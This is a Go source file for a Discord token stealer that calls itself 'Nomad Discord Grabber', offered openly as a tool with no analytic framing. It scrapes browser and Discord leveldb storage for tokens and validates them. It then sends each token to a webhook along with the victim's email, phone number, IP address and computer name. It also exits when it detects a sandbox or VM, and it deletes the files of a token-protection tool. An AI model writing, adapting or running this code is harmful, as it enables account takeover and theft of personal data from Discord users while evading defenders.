package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

var g_verbose = false
var g_anti_vm = true
var g_webhookURL = "https://discord.com/api/webhooks/INSERT_WEBHOOK_URL_HERE"

const (
	TOKEN_SCAN_TIMEOUT   = 30 * time.Second
	MAX_CONCURRENT_FILES = 10
)

type DiscordUser struct {
	ID            string `json:"id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Avatar        string `json:"avatar"`
	Email         string `json:"email"`
	Phone         string `json:"phone"`
	Nitro         int    `json:"premium_type"`
	Flags         int    `json:"flags"`
}

type DiscordGuild struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Icon        string `json:"icon"`
	Owner       bool   `json:"owner"`
	Permissions string `json:"permissions"`
}

type WebhookEmbed struct {
	Title       string              `json:"title"`
	Description string              `json:"description"`
	Color       int                 `json:"color"`
	Fields      []WebhookEmbedField `json:"fields"`
	Thumbnail   *WebhookThumbnail   `json:"thumbnail,omitempty"`
	Author      *WebhookAuthor      `json:"author,omitempty"`
	Footer      *WebhookFooter      `json:"footer,omitempty"`
	Timestamp   string              `json:"timestamp,omitempty"`
}

type WebhookEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type WebhookThumbnail struct {
	URL string `json:"url"`
}

type WebhookAuthor struct {
	Name    string `json:"name"`
	IconURL string `json:"icon_url,omitempty"`
}

type WebhookFooter struct {
	Text    string `json:"text"`
	IconURL string `json:"icon_url,omitempty"`
}

type WebhookMessage struct {
	Content   string         `json:"content,omitempty"`
	Embeds    []WebhookEmbed `json:"embeds"`
	Username  string         `json:"username,omitempty"`
	AvatarURL string         `json:"avatar_url,omitempty"`
}

func GetAppDataPath() string {
	return os.Getenv("APPDATA")
}

func GetLocalAppDataPath() string {
	return os.Getenv("LOCALAPPDATA")
}

func GetTempPath() string {
	return os.Getenv("TEMP")
}

func Log(format string, args ...interface{}) {
	if g_verbose {
		fmt.Printf(format+"\n", args...)
	}
}

func GetDiscordUserInfo(token string) (*DiscordUser, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("status code: %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var user DiscordUser
	err = json.Unmarshal(body, &user)
	if err != nil {
		return nil, err
	}

	return &user, nil
}

func GetUserBadges(flags int) string {
	badges := []string{}

	if flags&1<<0 != 0 {
		badges = append(badges, "💡 Discord Employee")
	}
	if flags&1<<1 != 0 {
		badges = append(badges, "👑 Discord Partner")
	}
	if flags&1<<2 != 0 {
		badges = append(badges, "🚀 HypeSquad Events")
	}
	if flags&1<<3 != 0 {
		badges = append(badges, "🦸 Bug Hunter Level 1")
	}
	if flags&1<<6 != 0 {
		badges = append(badges, "🌍 House Bravery")
	}
	if flags&1<<7 != 0 {
		badges = append(badges, "🏠 House Brilliance")
	}
	if flags&1<<8 != 0 {
		badges = append(badges, "🌟 House Balance")
	}
	if flags&1<<9 != 0 {
		badges = append(badges, "📆 Early Supporter")
	}
	if flags&1<<10 != 0 {
		badges = append(badges, "🐞 Bug Hunter Level 2")
	}
	if flags&1<<11 != 0 {
		badges = append(badges, "🤖 Verified Bot Developer")
	}
	if flags&1<<12 != 0 {
		badges = append(badges, "🔥 Active Developer")
	}
	if flags&1<<14 != 0 {
		badges = append(badges, "🏆 Certified Moderator")
	}

	if len(badges) == 0 {
		badges = append(badges, "No Badges")
	}

	return strings.Join(badges, ", ")
}

func GetNitroLevel(premiumType int) string {
	switch premiumType {
	case 1:
		return "✅ Nitro Classic"
	case 2:
		return "👑 Nitro Boost"
	default:
		return "❌ No Nitro"
	}
}

func GetAvatarURL(userID, avatarHash string) string {
	if avatarHash == "" {
		return "https://cdn.discordapp.com/embed/avatars/0.png"
	}
	return fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.png", userID, avatarHash)
}

func GetMachineIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "Unable to get IP"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "Unable to get IP"
	}

	return string(body)
}

func GetComputerName() string {
	name, err := os.Hostname()
	if err != nil {
		return "Unknown"
	}
	return name
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getUsername() string {
	return os.Getenv("USERNAME")
}

func validateRuntimeEnvironment() bool {
	if !g_anti_vm {
		return false
	}

	hostname := strings.ToLower(getHostname())
	suspiciousNames := []string{
		"sandbox", "virus", "malware", "analysis", "cuckoo", "forensic",
		"vmware", "virtualbox", "qemu", "vbox", "xen", "parallels",
	}
	for _, name := range suspiciousNames {
		if strings.Contains(hostname, name) {
			return true
		}
	}

	username := strings.ToLower(getUsername())
	suspiciousUsers := []string{
		"sandbox", "virus", "malware", "analysis", "cuckoo", "forensic",
		"vmware", "virtualbox", "qemu", "currentuser", "test", "user",
	}
	for _, name := range suspiciousUsers {
		if strings.Contains(username, name) {
			return true
		}
	}

	return false
}

func SendTokenToWebhook(token string, userInfo *DiscordUser) error {
	machineIP := GetMachineIP()
	computerName := GetComputerName()

	phoneValue := "Not verified"
	if userInfo.Phone != "" {
		phoneValue = userInfo.Phone
	}
	emailValue := "Not verified"
	if userInfo.Email != "" {
		emailValue = userInfo.Email
	}

	embed := WebhookEmbed{
		Title:       "🎯 Discord Data - Nomad Discord Grabber",
		Color:       0x5865F2,
		Description: fmt.Sprintf("**%s#%s**", userInfo.Username, userInfo.Discriminator),
		Thumbnail: &WebhookThumbnail{
			URL: GetAvatarURL(userInfo.ID, userInfo.Avatar),
		},
		Author: &WebhookAuthor{
			Name:    userInfo.Username,
			IconURL: GetAvatarURL(userInfo.ID, userInfo.Avatar),
		},
		Footer: &WebhookFooter{
			Text:    "Nomad Discord Grabber",
			IconURL: "https://cdn.discordapp.com/emojis/890324567892345678.png",
		},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Fields: []WebhookEmbedField{
			{
				Name:   "👤 Username",
				Value:  fmt.Sprintf("@%s#%s", userInfo.Username, userInfo.Discriminator),
				Inline: true,
			},
			{
				Name:   "🖥️ Machine IP",
				Value:  fmt.Sprintf("`%s` | `%s`", machineIP, computerName),
				Inline: true,
			},
			{
				Name:   "✨ Nitro",
				Value:  GetNitroLevel(userInfo.Nitro),
				Inline: true,
			},
			{
				Name:   "🎖️ Badges",
				Value:  GetUserBadges(userInfo.Flags),
				Inline: false,
			},
			{
				Name:   "📱 Phone Number",
				Value:  phoneValue,
				Inline: true,
			},
			{
				Name:   "📧 Email",
				Value:  emailValue,
				Inline: true,
			},
			{
				Name:   "🔑 Token",
				Value:  fmt.Sprintf("||`%s`||", token),
				Inline: false,
			},
		},
	}

	message := WebhookMessage{
		Embeds: []WebhookEmbed{embed},
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		return err
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(g_webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("webhook returned status: %d", resp.StatusCode)
	}

	return nil
}

func manageSecurityServices() {
	Log("\n🔒 Rimozione servizi di sicurezza...")
	protectorPath := filepath.Join(GetAppDataPath(), "DiscordTokenProtector")
	files := []string{"DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"}

	for _, file := range files {
		fullPath := filepath.Join(protectorPath, file)
		if err := os.Remove(fullPath); err != nil {
			if !os.IsNotExist(err) {
				Log("⚠️ Errore nella rimozione di %s: %v", file, err)
			}
		} else {
			Log("✅ Rimosso: %s", fullPath)
		}
	}
}

func FindTokensInChunk(data []byte, masterKey []byte) []string {
	tokens := []string{}

	dataStr := string(data)

	parts := strings.FieldsFunc(dataStr, func(r rune) bool {
		return r == '"' || r == '\'' || r == ' ' || r == '\n' || r == '\r' || r == '\t'
	})

	for _, part := range parts {

		if len(part) >= 50 && len(part) <= 100 && strings.Contains(part, ".") {
			if strings.Count(part, ".") == 2 {
				tokens = append(tokens, part)
			}
		}
	}

	return tokens
}

func IsTokenWorkingFast(token string) bool {
	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	if err != nil {
		return false
	}

	req.Header.Set("Authorization", token)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

func collectAndSendTokens() []string {
	Log("\n🎫 Grabbing Discord tokens...")
	roaming := GetAppDataPath()
	local := GetLocalAppDataPath()

	type PathEntry struct {
		Name      string
		Path      string
		IsDiscord bool
		MasterKey []byte
	}

	paths := []PathEntry{}

	browserPaths := []struct {
		name    string
		base    string
		profile string
	}{
		{"Chrome", "Google\\Chrome", "Default"},
		{"Edge", "Microsoft\\Edge", "Default"},
		{"Opera", "Opera Software\\Opera Stable", "Default"},
		{"Brave", "BraveSoftware\\Brave-Browser", "Default"},
	}

	for _, bp := range browserPaths {
		fullPath := filepath.Join(local, bp.base, "User Data", bp.profile, "Local Storage", "leveldb")
		if info, err := os.Stat(fullPath); err == nil && info.IsDir() {
			paths = append(paths, PathEntry{Name: bp.name, Path: fullPath, IsDiscord: false})
		}
	}

	discordPaths := []string{"discord", "discordcanary", "discordptb"}
	for _, dp := range discordPaths {
		fullPath := filepath.Join(roaming, dp, "Local Storage", "leveldb")
		if info, err := os.Stat(fullPath); err == nil && info.IsDir() {
			masterKey := []byte{}
			localStatePath := filepath.Join(roaming, dp, "Local State")
			if _, err := os.Stat(localStatePath); err == nil {

				masterKey = []byte("dummy_key")
			}
			paths = append(paths, PathEntry{Name: dp, Path: fullPath, IsDiscord: true, MasterKey: masterKey})
		}
	}

	tokens := []string{}
	seenTokens := make(map[string]bool)
	var tokensMutex sync.Mutex

	timeout := time.After(TOKEN_SCAN_TIMEOUT)
	done := make(chan bool)

	go func() {
		var wg sync.WaitGroup
		sem := make(chan struct{}, MAX_CONCURRENT_FILES)

		for _, entry := range paths {
			files, _ := filepath.Glob(filepath.Join(entry.Path, "*.ldb"))
			logFiles, _ := filepath.Glob(filepath.Join(entry.Path, "*.log"))
			files = append(files, logFiles...)

			sort.Slice(files, func(i, j int) bool {
				infoI, _ := os.Stat(files[i])
				infoJ, _ := os.Stat(files[j])
				return infoI.Size() > infoJ.Size()
			})

			for _, file := range files {
				wg.Add(1)
				sem <- struct{}{}

				go func(filePath, browserName string, isDiscord bool, masterKey []byte) {
					defer wg.Done()
					defer func() { <-sem }()

					select {
					case <-timeout:
						return
					default:
					}

					data, err := ioutil.ReadFile(filePath)
					if err != nil {
						return
					}

					foundTokens := FindTokensInChunk(data, masterKey)
					if len(foundTokens) > 0 {
						tokensMutex.Lock()
						for _, token := range foundTokens {
							if !seenTokens[token] && IsTokenWorkingFast(token) {
								seenTokens[token] = true
								tokens = append(tokens, token)
							}
						}
						tokensMutex.Unlock()
					}
				}(file, entry.Name, entry.IsDiscord, entry.MasterKey)
			}
		}

		wg.Wait()
		done <- true
	}()

	select {
	case <-done:
	case <-timeout:
		Log("⚠️ Timeout raggiunto durante la scansione dei token")
	}

	Log("✅ Found %d valid Discord tokens", len(tokens))

	for i, token := range tokens {
		Log("📤 Invio token %d/%d...", i+1, len(tokens))

		userInfo, err := GetDiscordUserInfo(token)
		if err != nil {
			Log("❌ Errore nel recupero info per token %d: %v", i+1, err)
			continue
		}

		err = SendTokenToWebhook(token, userInfo)
		if err != nil {
			Log("❌ Errore nell'invio del token %d: %v", i+1, err)
		} else {
			Log("✅ Token %d inviato con successo!", i+1)
		}

		time.Sleep(500 * time.Millisecond)
	}

	return tokens
}

func main() {
	if g_verbose {
		fmt.Println("=== Discord Token Manager ===")
		fmt.Println("Nomad Discord Grabber")
		fmt.Println(strings.Repeat("=", 40))
	}

	if validateRuntimeEnvironment() {
		os.Exit(1)
	}

	manageSecurityServices()

	tokens := collectAndSendTokens()

	if g_verbose {
		fmt.Println("\n" + strings.Repeat("=", 40))
		fmt.Printf("📊 Riepilogo Finale:\n")
		fmt.Printf("Token validi trovati: %d\n", len(tokens))

		if len(tokens) > 0 {
			fmt.Println("\n✅ Tutti i token sono stati inviati al webhook!")
		} else {
			fmt.Println("❌ Nessun token valido trovato")
		}

		fmt.Println("\nPremi un tasto per uscire...")
	}
	os.Exit(0)
}
